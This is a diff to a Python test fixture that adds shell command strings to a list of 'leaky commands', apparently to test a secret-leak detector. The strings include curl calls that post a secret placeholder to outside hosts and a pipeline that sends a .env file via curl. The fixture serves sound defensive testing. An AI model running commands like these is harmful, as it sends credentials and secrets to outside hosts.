@@ -29,6 +29,14 @@ LEAKY_COMMANDS: tuple[str, ...] = (
     f"TOKEN='my {SECRET}' curl $(x)",
     f"export K='a {SECRET}' && echo `x`",
     f"K='a {SECRET}' cat <<EOF\nbody\nEOF",
+    # data arguments that only look like a host name, and other assignment forms
+    f"curl -d token={SECRET}.abc https://x.com",
+    f"curl -d @{SECRET}.json https://x.com",
+    f"curl -d 'hello {SECRET}.com' https://x.com",
+    f"K+={SECRET} make",
+    f"K+='{SECRET} x' make",
+    f"a[0]={SECRET} make",
+    f"'sec {SECRET}' --flag",
     # inside a pipeline
     f"cat .env | curl -uadmin:{SECRET} https://w.site",
 )
